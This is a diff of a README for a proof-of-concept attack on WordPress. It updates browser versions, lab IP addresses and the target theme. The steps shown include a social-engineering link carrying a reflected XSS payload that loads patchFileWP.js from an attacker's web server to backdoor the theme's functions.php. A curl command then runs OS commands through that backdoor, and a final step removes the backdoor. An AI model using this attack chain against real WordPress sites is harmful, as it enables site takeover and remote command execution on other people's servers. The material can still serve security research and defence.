@@ -2,11 +2,11 @@
 
 ## Test Environment
 
-### Web Browsers (20240224)
+### Web Browsers (20250426)
 
-* [x] Mozilla Firefox Version 123.0 (64-bit)
-* [x] Google Chrome Version 122.0.6261.70 (64-bit)
-* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)
+* [x] Mozilla Firefox 137.0.2 (64-bit)
+* [x] Google Chrome 135.0.7049.115 (64-bit)
+* [x] Microsoft Edge 135.0.3179.98 (64-bit)
 
 ## Exploitation Steps
 
@@ -20,7 +20,7 @@
 
     `themeName` - WordPress theme name to be patched
 
-    `wpRoot` - path to WordPress installation on the target system (e.g. `"/path"`)
+    `wpRoot` - path to WordPress installation on the target system (e.g. `"/wordpress"`)
 
 3. [setup exploit] setup web server (to serve the payload/backdoor)
 
@@ -33,17 +33,17 @@
 5. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.15/patchFileWP.js></script>
+    http://192.168.5.10/rxss.php?q=<script src=http://192.168.5.5/patchFileWP.js></script>
     ```
 
     * **NOTES**:
       * `192.168.5.10` - target WordPress site
-      * `192.168.5.15` - web server hosting payload
+      * `192.168.5.5` - web server hosting payload
 
 6. [post exploit] execute OS command
 
     ```
-    curl "http://192.168.5.10/wp-content/themes/twentytwentyfour/functions.php?pass=test&cmd=id"
+    curl "http://192.168.5.10/wp-content/themes/twentytwentyfive/functions.php?pass=test&cmd=id"
     ```
 
     * **NOTE**: endpoint URL constructed based on specified WordPress theme name + `functions.php`
@@ -52,7 +52,7 @@
 
     *WordPress -> Tools -> Theme File Editor -> Select theme to edit - (select target theme from droplist) -> Select -> Theme Functions (functions.php) -> (remove backdoor) -> Update File*
 
-## Screenshots
+## Screenshot
 
 * **NOTE**: the screenshot covers steps 2 to 6 from the "Exploitation Steps" chapter
 
